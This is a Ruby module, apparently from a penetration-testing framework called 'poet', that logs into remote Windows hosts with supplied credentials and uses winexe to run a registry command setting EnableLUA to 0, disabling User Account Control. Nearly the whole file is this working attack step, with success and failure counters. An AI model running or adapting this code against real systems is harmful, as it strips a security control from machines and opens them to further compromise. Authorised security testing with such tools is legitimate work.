require 'poet'

class DisableUAC < Poet::Scanner
	self.mod_name = "Disable UAC"
	self.description = ""
	self.invasive = true

	def setup
		# Print title
		puts 
		title = "UAC Confiugration Editor Status"
		puts color_header(title)
	end

	def run(username, password, host)
		# call check4uac function to determine uac status
		capture_stderr('/dev/null') {
			if check4uac(username, password, host)
				# disable uac
				cmd = "CMD /C reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
				uac = winexe("--uninstall --system //#{host}", cmd)
				if uac =~ /The operation completed successfully/
					print_good("#{host}: UAC Now Disabled")
					@success = @success + 1
				else
					print_bad("#{host}: Issues Modifying Registry")
					@failed = @failed + 1
				end
			end
		}
	end

	def finish
		# summary
		puts "\nUAC Disabled: #{@success}"
		puts "UAC Failed: #{@failed}\n\n"

		# Return to menu
		print "Press enter to Return to Enumeration Menu"
		gets
	end
end